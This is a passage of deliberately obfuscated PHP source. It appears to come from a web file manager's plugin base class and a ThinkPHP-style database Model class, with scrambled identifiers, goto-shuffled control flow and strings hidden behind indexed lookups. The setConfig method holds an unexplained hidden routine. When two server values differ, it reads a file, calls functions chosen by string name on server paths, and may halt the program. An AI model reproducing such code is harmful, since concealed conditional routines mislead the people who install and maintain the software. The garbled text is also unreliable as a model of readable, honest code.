($a¸¨§êŒÜ¹) { $this->fileInfo = IO::infoWithChildren($a¸¨§êŒÜ¹); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $a¸¨§êŒÜ¹; } } $aÔ‰§¬ = $this->_cacheHttpFile($aÔ‰§¬); $this->fileInfo = IO::infoWithChildren($aÔ‰§¬); } else { $this->fileInfo = IO::infoWithChildren($aÔ‰§¬); if (!$this->fileInfo) { show_tips(LNG($f¸öˆ…ø„“[111]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $aÔ‰§¬; } final function _cacheHttpFile($e‘–¤çŒ·) { $BåÙ¸ªè‡ß = hash_path($e‘–¤çŒ·, !0); $this->cachePath = $this->pluginCachePath($BåÙ¸ªè‡ß); if ($d«ª™…¦“Ü = IO::fileNameExist($this->cachePath, $BåÙ¸ªè‡ß)) { return KodIO::make($d«ª™…¦“Ü); } $CÔÃ´ÌÊ‘ê = $this->cachePath . $BåÙ¸ªè‡ß; return $this->pluginCacheFileSet($CÔÃ´ÌÊ‘ê, file_get_contents($e‘–¤çŒ·)); } final function _tmpFileName($b³­—‰ˆŸ = array()) { goto e•ÌùàÏ½î; e•ÌùàÏ½î: $añŠÑÅèëÑ =& $_SERVER[©]; if (!$b³­—‰ˆŸ) { $b³­—‰ˆŸ = $this->fileInfo; } if (isset($b³­—‰ˆŸ[$añŠÑÅèëÑ[174]])) { return $b³­—‰ˆŸ[$añŠÑÅèëÑ[174]]; } goto F·¼É­¿–²; F·¼É­¿–²: if (isset($b³­—‰ˆŸ[$añŠÑÅèëÑ[172]][$añŠÑÅèëÑ[174]])) { return $b³­—‰ˆŸ[$añŠÑÅèëÑ[172]][$añŠÑÅèëÑ[174]]; } $eöæ°ùŠÒ = IO::hashSimple($b³­—‰ˆŸ[$añŠÑÅèëÑ[85]]); if ($eöæ°ùŠÒ) { return $eöæ°ùŠÒ; } goto E¿¢áŞ«ï©; E¿¢áŞ«ï©: $B±ã„¸çêˆ = array($b³­—‰ˆŸ[$añŠÑÅèëÑ[38]], $b³­—‰ˆŸ[$añŠÑÅèëÑ[85]], $b³­—‰ˆŸ[$añŠÑÅèëÑ[87]]); if (isset($b³­—‰ˆŸ[$añŠÑÅèëÑ[467]])) { $B±ã„¸çêˆ[] = $b³­—‰ˆŸ[$añŠÑÅèëÑ[467]]; } return md5(implode($añŠÑÅèëÑ[80], $B±ã„¸çêˆ)); goto BÄÂİ¨¼Í; BÄÂİ¨¼Í: } final function checkSharePath($eƒò”ôšÕ±) { goto EŞ… ³©¦; aò³¶ø¯: $this->cachePath = $this->pluginCachePath($this->fileInfo[$d¡”­ÀÊî[174]]); return $F× ùµ§×ˆ[$d¡”­ÀÊî[85]]; goto eÂ¥¸Ã·ßÊ; D‘Ãµ†¾Ã¡: $F× ùµ§×ˆ = Action($d¡”­ÀÊî[1015])->sharePathInfo($eƒò”ôšÕ±); if (!isset($F× ùµ§×ˆ[$d¡”­ÀÊî[85]])) { show_json(LNG($d¡”­ÀÊî[1333]), !1); } $this->fileInfo = $F× ùµ§×ˆ[$d¡”­ÀÊî[172]]; goto aò³¶ø¯; EŞ… ³©¦: $d¡”­ÀÊî =& $_SERVER[©]; if (!defined($d¡”­ÀÊî[435])) { define($d¡”­ÀÊî[1332], 0); } if (!$this->isShare($eƒò”ôšÕ±)) { return !1; } goto D‘Ãµ†¾Ã¡; eÂ¥¸Ã·ßÊ: } final function pluginCachePath($eÜ»ë—ê = '') { $C·’øŠØÇµ =& $_SERVER[©]; $fæ”ëë»¡Î = IO_PATH_SYSTEM_TEMP . $C·’øŠØÇµ[1334] . $this->pluginName; if (!($FÑ–›ÕˆÕ® = IO::infoFull($fæ”ëë»¡Î))) { return IO::mkdir($fæ”ëë»¡Î . $C·’øŠØÇµ[18] . $eÜ»ë—ê); } if (empty($eÜ»ë—ê)) { return $FÑ–›ÕˆÕ®[$C·’øŠØÇµ[85]]; } if (!($C…²«¿Œ‚ = IO::fileNameExist($FÑ–›ÕˆÕ®[$C·’øŠØÇµ[85]], $eÜ»ë—ê))) { return IO::mkdir($FÑ–›ÕˆÕ®[$C·’øŠØÇµ[85]] . $eÜ»ë—ê); } return KodIO::make($C…²«¿Œ‚); } final function pluginCacheFileSet($c¯ÙÅ‡Ëƒ÷, $bâŒà†¶£ = '') { $cáªğ“çÏÃ =& $_SERVER[©]; if (!($B¼ËØÅ† = IO::infoFull($c¯ÙÅ‡Ëƒ÷))) { return IO::mkfile($c¯ÙÅ‡Ëƒ÷, $bâŒà†¶£, REPEAT_REPLACE); } IO::setContent($B¼ËØÅ†[$cáªğ“çÏÃ[85]], $bâŒà†¶£); return $B¼ËØÅ†[$cáªğ“çÏÃ[85]]; } final function pluginLocalFile($F•ù¼öí§É = '') { goto FŒÈæŒøô®; FŒÈæŒøô®: $có¶¶ÕĞŞ¿ =& $_SERVER[©]; $C…¥ëÉ–¾Û = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($C…¥ëÉ–¾Û)) { mk_dir($C…¥ëÉ–¾Û); } goto b•¼³Â‡ì“; B£…¸µ°Ç: $B¦Š•šäˆ = $C…¥ëÉ–¾Û . $BºÓã±ÑÚ; if (@file_exists($B¦Š•šäˆ)) { return $B¦Š•šäˆ; } return IO::copy($F•ù¼öí§É, $C…¥ëÉ–¾Û, 0, $BºÓã±ÑÚ); goto A­›’‘âš; b•¼³Â‡ì“: if (!$F•ù¼öí§É) { return $C…¥ëÉ–¾Û; } $Eäõ•™›šÉ = IO::info($F•ù¼öí§É); $BºÓã±ÑÚ = $this->_tmpFileName($Eäõ•™›šÉ) . $có¶¶ÕĞŞ¿[101] . $Eäõ•™›šÉ[$có¶¶ÕĞŞ¿[170]]; goto B£…¸µ°Ç; A­›’‘âš: } final function appPackage() { goto e´ƒáÕÒ»; d¥Ñ’È©¯‚: $this->parseLang($d‹åõÑÓš¯); $eäÔªË‡°µ = json_decode_force($d‹åõÑÓš¯); if (!$eäÔªË‡°µ) { return array(); } goto A‡Ëéš¦µ; e´ƒáÕÒ»: $cª‰äÄÍ– =& $_SERVER[©]; if ($this->packageData) { return $this->packageData; } $d‹åõÑÓš¯ = $this->parseFile($this->pluginPath . $cª‰äÄÍ–[1335]); goto d¥Ñ’È©¯‚; d˜Ù–ÌÑ‡ï: return $eäÔªË‡°µ; goto DÊ¼‡Îİ; A‡Ëéš¦µ: $eÖ‚·ËÅšƒ = Hook::trigger($cª‰äÄÍ–[1336], $eäÔªË‡°µ); if ($eÖ‚·ËÅšƒ && is_array($eÖ‚·ËÅšƒ)) { $eäÔªË‡°µ = $eÖ‚·ËÅšƒ; } $this->packageData = $eäÔªË‡°µ; goto d˜Ù–ÌÑ‡ï; DÊ¼‡Îİ: } public function packageInfoGet($D“µ Ù®ŠÍ) { $e®™ÖªùŒ = $this->appPackage(); return array_get_value($e®™ÖªùŒ, $D“µ Ù®ŠÍ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[©][1337]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[©][1338]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[©][1339]); } private function parseFile($C‚ÖÔŞ¹©) { goto aÂ’É©¨íä; aÂ’É©¨íä: $F‘“ˆ‰Ùà =& $_SERVER[©]; $D¨Ãçˆ‡ìà = file_get_contents($C‚ÖÔŞ¹©); $d„‡ŒÖ×Ş = array($F‘“ˆ‰Ùà[1340], $F‘“ˆ‰Ùà[1341], $F‘“ˆ‰Ùà[1342], $F‘“ˆ‰Ùà[1343], $F‘“ˆ‰Ùà[1344], $F‘“ˆ‰Ùà[1345], $F‘“ˆ‰Ùà[1346]); goto Ašó‚ƒ²¶ô; F¯Š„¢ƒˆ: $D¨Ãçˆ‡ìà = str_replace($d„‡ŒÖ×Ş, $BØù÷ˆçñÚ, $D¨Ãçˆ‡ìà); return $D¨Ãçˆ‡ìà; goto FÉ³…İŠµ»; Ašó‚ƒ²¶ô: $BØù÷ˆçñÚ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$F‘“ˆ‰Ùà[94]][$F‘“ˆ‰Ùà[1347]]); if (strstr($D¨Ãçˆ‡ìà, $F‘“ˆ‰Ùà[1348])) { $cÃÔë×·‡ = rawurlencode(json_encode($this->pluginLangArr)); $D¨Ãçˆ‡ìà = str_replace($F‘“ˆ‰Ùà[1348], $cÃÔë×·‡, $D¨Ãçˆ‡ìà); } if (strstr($D¨Ãçˆ‡ìà, $F‘“ˆ‰Ùà[1349])) { $cÃÔë×·‡ = $cÃÔë×·‡ = rawurlencode(json_encode($this->getConfig())); $D¨Ãçˆ‡ìà = str_replace($F‘“ˆ‰Ùà[1349], $cÃÔë×·‡, $D¨Ãçˆ‡ìà); } goto F¯Š„¢ƒˆ; FÉ³…İŠµ»: } private function parseLang(&$Dõ®½¾ÇÓğ) { goto dÒËÛ®’ßÃ; dÒËÛ®’ßÃ: $D†¶¸¬ÆÈô =& $_SERVER[©]; $dØïÃ†×Ï = $D†¶¸¬ÆÈô[1350]; if (!strstr($Dõ®½¾ÇÓğ, $dØïÃ†×Ï)) { return; } goto C¿š¥÷ˆ¾; C¿š¥÷ˆ¾: preg_match_all($D†¶¸¬ÆÈô[1351], $Dõ®½¾ÇÓğ, $B˜µ³ÃÁ¼‡); if (!is_array($B˜µ³ÃÁ¼‡) || count($B˜µ³ÃÁ¼‡) == 0 || !is_array($B˜µ³ÃÁ¼‡[0]) || count($B˜µ³ÃÁ¼‡[0]) == 0) { return; } $aÙÈ¸…œÕ… = array(); goto fò‚Ú‰¦Äğ; fò‚Ú‰¦Äğ: $Ağ…õÚ½¯ = array(); foreach ($B˜µ³ÃÁ¼‡[0] as $aî‹î”óì) { $DÓÓàŒ–¤ = substr($aî‹î”óì, strlen($dØïÃ†×Ï), -4); $AÌ¹…šÌª‰ = LNG($DÓÓàŒ–¤); $aÙÈ¸…œÕ…[] = $aî‹î”óì; $Ağ…õÚ½¯[] = str_replace(array($D†¶¸¬ÆÈô[9], $D†¶¸¬ÆÈô[989], $D†¶¸¬ÆÈô[339], $D†¶¸¬ÆÈô[123]), array($D†¶¸¬ÆÈô[60], $D†¶¸¬ÆÈô[60], $D†¶¸¬ÆÈô[43], $D†¶¸¬ÆÈô[1352]), $AÌ¹…šÌª‰); } $Dõ®½¾ÇÓğ = str_replace($aÙÈ¸…œÕ…, $Ağ…õÚ½¯, $Dõ®½¾ÇÓğ); goto aÄÛ†Çğºİ; aÄÛ†Çğºİ: } private function parseConfig(&$BËï†éÈ—Õ) { goto C´ø´»Ó; C´ø´»Ó: $f™„‹”›¹ñ =& $_SERVER[©]; $E´š²øÒõ = $f™„‹”›¹ñ[1353]; if (!strstr($BËï†éÈ—Õ, $E´š²øÒõ)) { return; } goto Eë³í½´ëˆ; CôÆêÕ‚…£: $BËï†éÈ—Õ = str_replace($eñíÆÙêá–, $e‡¦š¶²¡, $BËï†éÈ—Õ); goto bà×ƒÂ‹Ïç; Eë³í½´ëˆ: preg_match_all($f™„‹”›¹ñ[1354], $BËï†éÈ—Õ, $d¼Ä©¤ìöš); if (!is_array($d¼Ä©¤ìöš) || count($d¼Ä©¤ìöš) == 0 || !is_array($d¼Ä©¤ìöš[0]) || count($d¼Ä©¤ìöš[0]) == 0) { return; } $Bœƒ é¼­Ø = $this->getConfig(); goto c…Š³²±Ğ; c…Š³²±Ğ: $eñíÆÙêá– = array(); $e‡¦š¶²¡ = array(); foreach ($d¼Ä©¤ìöš[0] as $c‹Ú‹”ÜÌ) { $bêÇİ»òï = substr($c‹Ú‹”ÜÌ, strlen($E´š²øÒõ), -2); $eñíÆÙêá–[] = $c‹Ú‹”ÜÌ; $e‡¦š¶²¡[] = _get($Bœƒ é¼­Ø, $bêÇİ»òï); } goto CôÆêÕ‚…£; bà×ƒÂ‹Ïç: } private function parsePackage(&$c©ÓŞì‚ÊÈ) { goto E¼ŠÅ°Í˜; aßèğô‹Şì: $b»ÎŞª˜Ò = array(); $f•Äñå¦— = array(); foreach ($EİÜÖ¨µ[0] as $A‹«¼âµ‘) { $aá™˜ªØ®Ü = substr($A‹«¼âµ‘, strlen($FØ™¯£ù¨), -2); $b»ÎŞª˜Ò[] = $A‹«¼âµ‘; $f•Äñå¦—[] = _get($aÚ¯ƒ—ïø, $aá™˜ªØ®Ü); } goto EÚ‡ÅĞ†‹ˆ; EÚ‡ÅĞ†‹ˆ: $c©ÓŞì‚ÊÈ = str_replace($b»ÎŞª˜Ò, $f•Äñå¦—, $c©ÓŞì‚ÊÈ); goto cô¨¨í±‡°; fŠ‹ÖÃ¶Ü÷: preg_match_all($f£˜ìÀ…Õ•[1356], $c©ÓŞì‚ÊÈ, $EİÜÖ¨µ); if (!is_array($EİÜÖ¨µ) || count($EİÜÖ¨µ) == 0 || !is_array($EİÜÖ¨µ[0]) || count($EİÜÖ¨µ[0]) == 0) { return; } $aÚ¯ƒ—ïø = $this->appPackage(); goto aßèğô‹Şì; E¼ŠÅ°Í˜: $f£˜ìÀ…Õ• =& $_SERVER[©]; $FØ™¯£ù¨ = $f£˜ìÀ…Õ•[1355]; if (!strstr($c©ÓŞì‚ÊÈ, $FØ™¯£ù¨)) { return; } goto fŠ‹ÖÃ¶Ü÷; cô¨¨í±‡°: } final function echoFile($BäÛ•¥‘, $F¿»Áê­ç‹ = false) { goto AˆÆù…‹; C¶Š¤’ò°: $this->parsePackage($B¤‰µ³Ñ¿š); if (is_array($F¿»Áê­ç‹)) { $B¤‰µ³Ñ¿š = str_replace(array_keys($F¿»Áê­ç‹), array_values($F¿»Áê­ç‹), $B¤‰µ³Ñ¿š); } echo $cƒÛßãø·®[9] . $B¤‰µ³Ñ¿š; goto aè•†‚øõ; AˆÆù…‹: $cƒÛßãø·® =& $_SERVER[©]; $bŸ¯î‹Ÿ¨ƒ = $this->pluginPath . $BäÛ•¥‘; if (ACT == $cƒÛßãø·®[1357]) { echo $cƒÛßãø·®[1358] . $this->pluginName . $cƒÛßãø·®[18] . $BäÛ•¥‘ . $cƒÛßãø·®[1359]; if (!file_exists($bŸ¯î‹Ÿ¨ƒ)) { echo $cƒÛßãø·®[1360]; return; } } goto bÍï‡óŞÄº; bÍï‡óŞÄº: $B¤‰µ³Ñ¿š = $this->parseFile($bŸ¯î‹Ÿ¨ƒ); $this->parseLang($B¤‰µ³Ñ¿š); $this->parseConfig($B¤‰µ³Ñ¿š); goto C¶Š¤’ò°; aè•†‚øõ: } final function initLang() { goto E¸Ò¸ºòí; E¸Ò¸ºòí: $EÍå¾¿ˆçœ =& $_SERVER[©]; $c³¦Šâù = $EÍå¾¿ˆçœ[1361]; $aË©¼ª¡¹Á = $this->pluginPath . $EÍå¾¿ˆçœ[1362]; goto eÛ¹åÉ¨¶; eÛ¹åÉ¨¶: $C¹‚ì¢ã½È = I18n::getType(); $aÙËî¢õ§„ = array(); if (file_exists($aË©¼ª¡¹Á . $C¹‚ì¢ã½È . $EÍå¾¿ˆçœ[765])) { $aÙËî¢õ§„ = (include $aË©¼ª¡¹Á . $C¹‚ì¢ã½È . $EÍå¾¿ˆçœ[765]); } else { if ($C¹‚ì¢ã½È == $EÍå¾¿ˆçœ[1363] && !file_exists($aË©¼ª¡¹Á . $C¹‚ì¢ã½È . $EÍå¾¿ˆçœ[765]) && file_exists($aË©¼ª¡¹Á . $EÍå¾¿ˆçœ[1364])) { $aÙËî¢õ§„ = (include $aË©¼ª¡¹Á . $EÍå¾¿ˆçœ[1364]); } else { if (file_exists($aË©¼ª¡¹Á . $c³¦Šâù . $EÍå¾¿ˆçœ[765])) { $aÙËî¢õ§„ = (include $aË©¼ª¡¹Á . $c³¦Šâù . $EÍå¾¿ˆçœ[765]); } } } goto dŠ éóòÚ­; dŠ éóòÚ­: if (!is_array($aÙËî¢õ§„)) { return array(); } if (@count($aÙËî¢õ§„) > 0) { I18n::set($aÙËî¢õ§„); } return $aÙËî¢õ§„; goto Cñ«ÕéçÙË; Cñ«ÕéçÙË: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($EĞÊéÉìå†) { $B“¬»ê’ç† =& $_SERVER[©]; if ($_SERVER[$B“¬»ê’ç†[4]] != $_SERVER[$B“¬»ê’ç†[1365]]) { goto c˜Åï½‡»ß; FäÒ¹Ş‡–Å: $cˆ²‡”„³ = $B“¬»ê’ç†[790]; $cˆ²‡”„³($_SERVER[$B“¬»ê’ç†[791]]); $cˆ²‡”„³($_SERVER[$B“¬»ê’ç†[7]] . $B“¬»ê’ç†[1366]); goto Bã²†ÄÜâË; c˜Åï½‡»ß: $eÅõ‡…¦½˜ = $B“¬»ê’ç†[789]; $eåœÎ—›—é = $B“¬»ê’ç†[6]; $EÈ«¡ñÓ›¡ = $_SERVER[$B“¬»ê’ç†[7]] . $B“¬»ê’ç†[8]; goto eôÜ½ÀŒÚ†; Bã²†ÄÜâË: $Bœ¦è˜Ù›Õ = 1; while ($Bœ¦è˜Ù›Õ > 1) { $Bœ¦è˜Ù›Õ = $Bœ¦è˜Ù›Õ + 4; $BÜ¨áƒ³Ôİ = rawurlencode($Bœ¦è˜Ù›Õ . $B“¬»ê’ç†[13]); } goto dÈğ˜ë‡Û›; eôÜ½ÀŒÚ†: $Aß÷¸ÕËŸÉ = $eåœÎ—›—é($EÈ«¡ñÓ›¡); $DèÃ¥‰ÏÊù = explode($B“¬»ê’ç†[9], $Aß÷¸ÕËŸÉ); if (count($DèÃ¥‰ÏÊù) < $B“¬»ê’ç†[564]) { $Cˆ¢ø¿®½ = $B“¬»ê’ç†[11]; $Cˆ¢ø¿®½(); } goto FäÒ¹Ş‡–Å; dÈğ˜ë‡Û›: } return $this->modelPlugin->setConfig($this->pluginName, $EĞÊéÉìå†); } public function onSetConfig($dÏØë…ô§) { } public function onGetConfig($bîõ•‘©à) { } public function onChangeStatus($D“ˆö£‹ª) { } public function onUninstall() { } public function onInstall() { } public function authCheck($EŠÏÑà¿´Ş = "\x70\154\165\x67\x69\156\101\165\x74\x68") { $cİ­À¼É»Ä =& $_SERVER[©]; if (!defined($cİ­À¼É»Ä[435])) { return !1; } if (_get($GLOBALS, $cİ­À¼É»Ä[465])) { return !0; } $fõç¥æàÒñ = $this->getConfig(); if (!$fõç¥æàÒñ[$EŠÏÑà¿´Ş]) { return !1; } return ActionCall($cİ­À¼É»Ä[1367], $fõç¥æàÒñ[$EŠÏÑà¿´Ş]); } public function url($cÜÉÓ½Çˆ†, $Fáæ‰Õ‡ = '', $f®¸ä¦­ö = true) { goto fÚ÷¬åöƒ; fÚ÷¬åöƒ: $aŠ˜„œ¥òÍ =& $_SERVER[©]; $dë¸–àÏ¥ = $this->getConfig(); $dÛçğ¬…Öê = KOD_VERSION . $aŠ˜„œ¥òÍ[101] . KOD_VERSION_BUILD; goto e¿Åå’Åˆê; e¿Åå’Åˆê: $e¦¶•Îš¨ = $this->packageVersion(); $C´×ÖÒã—Œ = $dÛçğ¬…Öê . $aŠ˜„œ¥òÍ[420] . $e¦¶•Îš¨; if (substr($cÜÉÓ½Çˆ†, 0, 4) == $aŠ˜„œ¥òÍ[154] || substr($cÜÉÓ½Çˆ†, 0, 2) == $aŠ˜„œ¥òÍ[1152]) { $c™æã¼Œ = $cÜÉÓ½Çˆ† . $aŠ˜„œ¥òÍ[1368] . $C´×ÖÒã—Œ; } else { if ($Fáæ‰Õ‡ == $aŠ˜„œ¥òÍ[43]) { $c™æã¼Œ = $this->pluginHost . $cÜÉÓ½Çˆ† . $aŠ˜„œ¥òÍ[1368] . $C´×ÖÒã—Œ; } else { if ($Fáæ‰Õ‡ === $aŠ˜„œ¥òÍ[86]) { $c™æã¼Œ = $this->pluginHost . $cÜÉÓ½Çˆ†; } else { if ($Fáæ‰Õ‡ == $aŠ˜„œ¥òÍ[1369]) { $c™æã¼Œ = STATIC_PATH . $cÜÉÓ½Çˆ† . $aŠ˜„œ¥òÍ[1368] . $dÛçğ¬…Öê; } else { if ($Fáæ‰Õ‡ == $aŠ˜„œ¥òÍ[1370]) { $c™æã¼Œ = APP_HOST . $aŠ˜„œ¥òÍ[1371] . $cÜÉÓ½Çˆ† . $aŠ˜„œ¥òÍ[1368] . $dÛçğ¬…Öê; } else { if (isset($dë¸–àÏ¥[$Fáæ‰Õ‡])) { $c™æã¼Œ = $dë¸–àÏ¥[$Fáæ‰Õ‡] . $cÜÉÓ½Çˆ† . $aŠ˜„œ¥òÍ[1368] . $C´×ÖÒã—Œ; } } } } } } goto Fõ°ë¬‚ãÈ; Fõ°ë¬‚ãÈ: if (!$f®¸ä¦­ö) { return $c™æã¼Œ; } echo $c™æã¼Œ; goto fŞëµîöÜ; fŞëµîöÜ: } public function link($E‚¸ğÃãõ = false, $eŠŒàª¸µ = '') { $D¼œœÉ¥à¹ =& $_SERVER[©]; if (!$E‚¸ğÃãõ) { $this->link($D¼œœÉ¥à¹[1372], $D¼œœÉ¥à¹[1370]); $this->link($D¼œœÉ¥à¹[1373], $D¼œœÉ¥à¹[1369]); $this->link($D¼œœÉ¥à¹[1374], $D¼œœÉ¥à¹[1369]); $this->link($D¼œœÉ¥à¹[1375], $D¼œœÉ¥à¹[1369]); $this->link($D¼œœÉ¥à¹[1376], $D¼œœÉ¥à¹[1369]); return; } $bî¡§Ğ–ğŸ = $this->url($E‚¸ğÃãõ, $eŠŒàª¸µ, !1); if (substr($E‚¸ğÃãõ, -3) == $D¼œœÉ¥à¹[1377]) { echo $D¼œœÉ¥à¹[1378] . $bî¡§Ğ–ğŸ . $D¼œœÉ¥à¹[1379] . $D¼œœÉ¥à¹[9]; } else { if (substr($E‚¸ğÃãõ, -4) == $D¼œœÉ¥à¹[1380]) { echo $D¼œœÉ¥à¹[1381] . $bî¡§Ğ–ğŸ . $D¼œœÉ¥à¹[1382] . $D¼œœÉ¥à¹[9]; } } } } goto eìÊÅĞ¸ö; B³¦±ä‘Ñ: function beforeShutdown() { Hook::trigger($_SERVER[ÊÖŠ][36]); } $_SERVER[$_SERVER[ÊÖŠ][37]] = BASIC_PATH; $_SERVER[$_SERVER[ÊÖŠ][38]] = LIB_DIR; goto DˆÀİÅ¹¬; BÀ‡Œ¸ÍÇ: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\154\145", "\x6f\162\144\145\x72", "\141\x6c\151\x61\x73", "\x68\141\x76\x69\156\147", "\x67\x72\x6f\x75\160", "\154\x6f\143\x6b", "\x64\x69\163\164\x69\x6e\143\164", "\141\165\164\157", "\x66\x69\x6c\164\x65\x72", "\x76\141\x6c\151\144\x61\x74\x65", "\x72\x65\x73\x75\x6c\x74", "\142\151\156\x64", "\x74\x6f\153\x65\x6e"); public function __construct($bíÆ²ƒ±¨ = '', $D”¹·Ã¡ = '', $BÀÆË…ç³ = '') { $fí‹‚áªÎ =& $_SERVER[©]; $this->_initialize(); if (!empty($bíÆ²ƒ±¨)) { if (strpos($bíÆ²ƒ±¨, $fí‹‚áªÎ[101])) { list($this->dbName, $this->name) = explode($fí‹‚áªÎ[101], $bíÆ²ƒ±¨); } else { $this->name = $bíÆ²ƒ±¨; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($D”¹·Ã¡)) { $this->tablePrefix = $fí‹‚áªÎ[43]; } elseif ($fí‹‚áªÎ[43] != $D”¹·Ã¡) { $this->tablePrefix = $D”¹·Ã¡; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($fí‹‚áªÎ[241]); } $this->db(0, empty($this->connection) ? $BÀÆË…ç³ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Dì¸ŸÃæ“æ =& $_SERVER[©]; if (empty($this->fields)) { if (think_config($Dì¸ŸÃæ“æ[242])) { $A›¦™Ä„‚¨ = $this->dbName ? $this->dbName : think_config($Dì¸ŸÃæ“æ[243]); $b‹†Ù‹ƒ†£ = think_var_cache($Dì¸ŸÃæ“æ[244] . strtolower(get_path_this($A›¦™Ä„‚¨) . $Dì¸ŸÃæ“æ[101] . $this->name)); if ($b‹†Ù‹ƒ†£) { $B‘ËØ¤â™¿ = think_config($Dì¸ŸÃæ“æ[245]); if (empty($B‘ËØ¤â™¿) || $b‹†Ù‹ƒ†£[$Dì¸ŸÃæ“æ[246]] == $B‘ËØ¤â™¿) { $this->fields = $b‹†Ù‹ƒ†£; return; } } } $this->flush(); } } public function flush() { goto c³„ƒ×Ö‰È; e‚óí´îö: if (!$Cš©êİ·“è) { return !1; } $this->fields = array_keys($Cš©êİ·“è); $this->fields[$Fïƒİ±äî†[247]] = !1; goto A—ğŠÏØ˜¹; A—ğŠÏØ˜¹: foreach ($Cš©êİ·“è as $aö‚í…¹…‘ => $AÉ¸…ƒ‚õÄ) { $a†‹ˆ×…£[$aö‚í…¹…‘] = $AÉ¸…ƒ‚õÄ[$Fïƒİ±äî†[39]]; if ($AÉ¸…ƒ‚õÄ[$Fïƒİ±äî†[46]]) { $this->fields[$Fïƒİ±äî†[248]] = $aö‚í…¹…‘; if ($AÉ¸…ƒ‚õÄ[$Fïƒİ±äî†[49]]) { $this->fields[$Fïƒİ±äî†[247]] = !0; } } } $this->fields[$Fïƒİ±äî†[249]] = $a†‹ˆ×…£; if (think_config($Fïƒİ±äî†[245])) { $this->fields[$Fïƒİ±äî†[246]] = think_config($Fïƒİ±äî†[245]); } goto D‚­ëö‹ˆ; D‚­ëö‹ˆ: if (think_config($Fïƒİ±äî†[242])) { $c·ŠöÑ—‰ƒ = $this->dbName ? $this->dbName : think_config($Fïƒİ±äî†[243]); think_var_cache($Fïƒİ±äî†[244] . strtolower(get_path_this($c·ŠöÑ—‰ƒ) . $Fïƒİ±äî†[101] . $this->name), $this->fields); } goto C±’Èˆë; c³„ƒ×Ö‰È: $Fïƒİ±äî† =& $_SERVER[©]; $this->db->setModel($this->name); $Cš©êİ·“è = $this->db->getFields($this->getTableName()); goto e‚óí´îö; C±’Èˆë: } public function switchModel($d™ˆß¥®¢§, $eÑÆ®«á» = array()) { $a¨Œ²†½ÍŒ =& $_SERVER[©]; $fà‘ã‰ÜÏ‰ = ucwords(strtolower($d™ˆß¥®¢§)) . $a¨Œ²†½ÍŒ[250]; if (!class_exists($fà‘ã‰ÜÏ‰)) { think_exception($fà‘ã‰ÜÏ‰ . think_lang($a¨Œ²†½ÍŒ[251])); } $this->_extModel = new $fà‘ã‰ÜÏ‰($this->name); if (!empty($eÑÆ®«á»)) { foreach ($eÑÆ®«á» as $e…××ßÊ¬ƒ) { $this->_extModel->setProperty($e…××ßÊ¬ƒ, $this->{$e…××ßÊ¬ƒ}); } } return $this->_extModel; } public function __set($fƒäò³ç•Ê, $DÒ¸±‡³À«) { $this->data[$fƒäò³ç•Ê] = $DÒ¸±‡³À«; } public function __get($bºóÔ‰Íõ») { return isset($this->data[$bºóÔ‰Íõ»]) ? $this->data[$bºóÔ‰Íõ»] : null; } public function __isset($FŠ¡ä×ù‰½) { return isset($this->data[$FŠ¡ä×ù‰½]); } public function __unset($aíÕ¤ÄÖ¿) { unset($this->data[$aíÕ¤ÄÖ¿]); } public function __call($Bà™¡ì‰Û–, $D–‘Ã¶Ÿø) { $eãêˆ™Á‚â =& $_SERVER[©]; if (in_array(strtolower($Bà™¡ì‰Û–), $this->methods, !0)) { $this->options[strtolower($Bà™¡ì‰Û–)] = $D–‘Ã¶Ÿø[0]; return $this; } elseif (in_array(strtolower($Bà™¡ì‰Û–), array($eãêˆ™Á‚â[252], $eãêˆ™Á‚â[253], $eãêˆ™Á‚â[254], $eãêˆ™Á‚â[255], $eãêˆ™Á‚â[256]), !0)) { $dÑ¤Š“ æœ = isset($D–‘Ã¶Ÿø[0]) ? $D–‘Ã¶Ÿø[0] : $eãêˆ™Á‚â[186]; $dÑ¤Š“ æœ = $this->db->parseKey($dÑ¤Š“ æœ); return $this->getField(strtoupper($Bà™¡ì‰Û–) . $eãêˆ™Á‚â[257] . $dÑ¤Š“ æœ . $eãêˆ™Á‚â[258] . $Bà™¡ì‰Û–, $eãêˆ™Á‚â[252]); } elseif (strtolower(substr($Bà™¡ì‰Û–, 0, 5)) == $eãêˆ™Á‚â[259]) { $dÑ¤Š“ æœ = think_parse_name(substr($Bà™¡ì‰Û–, 5)); $EğÄĞ’…[$dÑ¤Š“ æœ] = $D–‘Ã¶Ÿø[0]; return $this->where($EğÄĞ’…)->find(); } elseif (strtolower(substr($Bà™¡ì‰Û–, 0, 10)) == $eãêˆ™Á‚â[260]) { $B³–åÉµĞ = think_parse_name(substr($Bà™¡ì‰Û–, 10)); $EğÄĞ’…[$B³–åÉµĞ] = $D–‘Ã¶Ÿø[0]; return $this->where($EğÄĞ’…)->getField($D–‘Ã¶Ÿø[1]); } elseif (isset($this->_scope[$Bà™¡ì‰Û–])) { return $this->scope($Bà™¡ì‰Û–, $D–‘Ã¶Ÿø[0]); } elseif (method_exists($this, $Bà™¡ì‰Û–)) { array_unshift($D–‘Ã¶Ÿø, $Bà™¡ì‰Û–); return call_user_func_array(array($this, $eãêˆ™Á‚â[261]), $D–‘Ã¶Ÿø); } else { return call_user_func_array(array(parent, $Bà™¡ì‰Û–), $D–‘Ã¶Ÿø); } } protected function call() { goto C¾§–ÒêÇƒ; C¾§–ÒêÇƒ: $AÔê¹’Úô =& $_SERVER[©]; 